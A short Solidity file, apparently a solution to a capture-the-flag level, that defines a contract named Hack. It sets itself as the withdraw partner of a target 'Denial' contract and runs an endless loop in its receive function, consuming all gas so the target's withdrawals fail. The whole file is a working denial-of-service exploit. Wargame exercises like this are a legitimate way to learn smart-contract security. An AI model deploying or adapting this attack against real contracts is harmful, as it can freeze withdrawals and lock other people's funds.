// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract Hack {
    constructor(address contractAddress) {
        IDenial(contractAddress).setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (1 > 0) {
            uint i = 1 + 1;
        }
    }
}
